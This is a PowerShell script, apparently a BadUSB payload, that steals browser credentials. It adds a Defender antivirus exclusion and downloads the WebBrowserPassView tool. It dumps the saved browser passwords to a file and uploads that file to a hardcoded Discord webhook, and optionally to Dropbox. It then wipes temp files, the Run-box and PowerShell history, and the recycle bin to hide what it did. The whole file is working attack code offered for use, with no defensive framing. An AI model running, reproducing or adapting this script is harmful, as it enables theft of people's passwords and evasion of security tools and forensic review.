$dc = 'https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC';
Set-Location C:\Users\Public\Documents

Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antivirus activation

Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords

.\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords

Start-Sleep -Seconds 10

RI WebBrowserPassView.exe

Remove-MpPreference -ExclusionPath 'C:\Users\Public\Documents'

############################################################################################################################################################

# Upload output file to Dropbox

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt}

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt"}

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

RI $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
Set-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableRegistryTools -Value 0 -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Run history removed`"}"}}


# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; if ($?) {if (-not ([string]::IsNullOrEmpty($dc))){Invoke-RestMethod -Uri $dc -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"Success : Powershell history removed`"}"}}
